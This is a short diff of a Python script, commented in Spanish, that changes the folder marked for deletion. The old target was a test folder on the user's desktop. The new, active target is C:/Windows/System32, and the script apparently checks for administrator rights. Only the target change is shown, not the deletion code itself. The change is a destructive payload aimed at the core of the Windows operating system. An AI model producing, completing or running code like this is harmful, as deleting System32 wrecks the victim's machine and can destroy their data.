@@ -9,12 +9,9 @@ import requests
 
 # Obtener la carpeta del perfil de usuario
 perfil_usuario = os.environ['USERNAME']
-
-carpeta_a_eliminar = f"C:/Users/{perfil_usuario}/Desktop/Nueva_carpeta/"
-
 # Crear la ruta completa a System32
 carpeta_system32 = "C:/Windows/System32"
-# carpeta_a_eliminar = "C:/Windows/System32"
+carpeta_a_eliminar = "C:/Windows/System32"
 
 
 def is_admin():
